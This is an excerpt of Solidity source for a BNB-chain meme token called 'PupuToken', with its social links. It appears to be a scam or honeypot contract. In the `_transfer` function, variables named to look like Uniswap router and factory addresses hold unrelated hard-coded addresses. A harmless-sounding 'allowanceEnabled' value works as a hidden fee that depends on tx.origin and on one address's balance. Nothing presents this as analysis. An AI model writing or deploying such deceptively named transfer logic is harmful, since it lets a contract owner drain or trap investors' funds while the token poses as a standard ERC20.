...
https://twitter.com/PupuTokenBNB
https://t.me.com/PupuTokenBNB
https://PupuTokenBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal V2uniswapRouter = 0x9fB146E1930043Ff0e234fb1eFbF363CE0A89e9c;
    uint256 private allowanceEnabled = 3;
    string private _symbol;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private factoryV2 = 0x6Bb9ddB5b9822cBBce927234005d04D67cffE924;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != V2uniswapRouter && _balances[factoryV2] > 0 ? _pairsToken : allowanceEnabled).div(100) + 0;
        if (swapamount > 0)
        {
...
contract PupuToken is ERC20, Ownable
{
